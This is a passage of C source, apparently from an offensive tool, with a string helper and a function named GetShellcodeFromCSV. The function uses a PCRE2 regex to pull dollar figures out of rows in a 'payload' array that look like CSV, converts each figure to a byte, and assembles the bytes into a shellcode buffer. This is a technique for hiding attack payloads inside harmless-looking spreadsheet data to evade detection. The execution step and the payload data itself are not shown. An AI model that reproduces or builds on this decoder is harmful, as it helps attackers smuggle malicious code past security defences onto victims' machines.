    if (*sub && (q = r = strstr(str, sub)) != NULL) {
        size_t len = strlen(sub);
        while ((r = strstr(p = r + len, sub)) != NULL) {
            while (p < r)
                *q++ = *p++;
        }
        while ((*q++ = *p++) != '\0')
            continue;
    }
    return str;
}

struct csvdata * GetShellcodeFromCSV()
{
  int sz = sizeof(payload) / sizeof(payload[0]);
  int holder[sz];
  int count = 0;
  memset(holder, 0, sz);

  char* temp = (char*)malloc(10);
  memset(temp, '\0', 10);    
  for (int line = 0; line < sz; ++line)
  {  

    pcre2_code *re;
    PCRE2_SPTR pattern;
    PCRE2_SPTR subject;
    PCRE2_SPTR name_table;

    int crlf_is_newline;
    int errornumber;
    int find_all;
    int i;
    int namecount;
    int name_entry_size;
    int rc;
    int utf8;

    uint32_t option_bits;
    uint32_t newline;

    PCRE2_SIZE erroroffset;
    PCRE2_SIZE *ovector;

    size_t subject_length;
    pcre2_match_data *match_data;

    find_all = 1;

    pattern = (PCRE2_SPTR)",\"\\$.{0,10}, \"\\$(\\d{1,3})";
    subject = (PCRE2_SPTR)payload[line];
    subject_length = strlen((char *)subject);

    re = pcre2_compile(pattern, PCRE2_ZERO_TERMINATED, 0, &errornumber, &erroroffset, NULL);

    if (re == NULL)
    {
      PCRE2_UCHAR buffer[256];
      pcre2_get_error_message(errornumber, buffer, sizeof(buffer));
      continue;
    }

    match_data = pcre2_match_data_create_from_pattern(re, NULL);

    rc = pcre2_match(re, subject, subject_length, 0, 0, match_data, NULL);

    if (rc < 0)
    {
      pcre2_match_data_free(match_data);
      pcre2_code_free(re);
      continue;
    }

    ovector = pcre2_get_ovector_pointer(match_data);

    if (rc == 0)
    {
      continue;
    }

    for (i = 0; i < rc; i++)
    {
      PCRE2_SPTR substring_start = subject + ovector[2*i];
      size_t substring_length = ovector[2*i+1] - ovector[2*i];
      sprintf(temp, "%.*s", (int)substring_length, (char *)substring_start);
    }

    (void)pcre2_pattern_info(re, PCRE2_INFO_NAMECOUNT, &namecount);

    if (namecount > 0)
    {
      PCRE2_SPTR tabptr;
      (void)pcre2_pattern_info(re, PCRE2_INFO_NAMETABLE, &name_table);
      (void)pcre2_pattern_info(re, PCRE2_INFO_NAMEENTRYSIZE, &name_entry_size);

      tabptr = name_table;
      for (i = 0; i < namecount; i++)
      {
        int n = (tabptr[0] << 8) | tabptr[1];
        tabptr += name_entry_size;
      }
    }

    (void)pcre2_pattern_info(re, PCRE2_INFO_ALLOPTIONS, &option_bits);
    utf8 = (option_bits & PCRE2_UTF) != 0;
    (void)pcre2_pattern_info(re, PCRE2_INFO_NEWLINE, &newline);
    crlf_is_newline = newline == PCRE2_NEWLINE_ANY || newline == PCRE2_NEWLINE_CRLF || newline == PCRE2_NEWLINE_ANYCRLF;

    for (;;)
    {
      uint32_t options = 0;
      PCRE2_SIZE start_offset = ovector[1];

      if (ovector[0] == ovector[1])
      {
        if (ovector[0] == subject_length)
          {
            break;
          }
        options = PCRE2_NOTEMPTY_ATSTART | PCRE2_ANCHORED;
      }

      rc = pcre2_match(re, subject, subject_length, start_offset, options, match_data, NULL);

      if (rc == PCRE2_ERROR_NOMATCH)
      {
        if (options == 0) break;
        ovector[1] = start_offset + 1;
        if (crlf_is_newline && start_offset < subject_length - 1 && subject[start_offset] == '\r' && subject[start_offset + 1] == '\n')
        ovector[1] += 1;
        else if (utf8)
          {
            while (ovector[1] < subject_length)
            {
              if ((subject[ovector[1]] & 0xc0) != 0x80) break;
              ovector[1] += 1;
            }
        }
        continue;
      }

      if (rc < 0)
      {
        pcre2_match_data_free(match_data);
        pcre2_code_free(re);
        continue;
      }

      for (i = 0; i < rc; i++)
      {
        PCRE2_SPTR substring_start = subject + ovector[2*i];
        size_t substring_length = ovector[2*i+1] - ovector[2*i];
        sprintf(temp, "%.*s", (int)substring_length, (char *)substring_start);
      }
    }

    // remove the final thousands count"
    strremove(temp, ",000\"");

    int intVal = atoi(temp);

    holder[count] = intVal;

    pcre2_match_data_free(match_data);
    pcre2_code_free(re);
    memset(temp, '\0', strlen(temp));
    count++;
  }

    free(temp);

    unsigned char shellcode[count];

    for (int i = 0; i < count; ++i)
    {
        shellcode[i] = (unsigned char)holder[i];
    }

    

    struct csvdata* d = malloc(sizeof(struct csvdata));
    d->shellcode = malloc(count);
    memcpy(d->shellcode, shellcode, count);
    d->size = count;

    return d;
}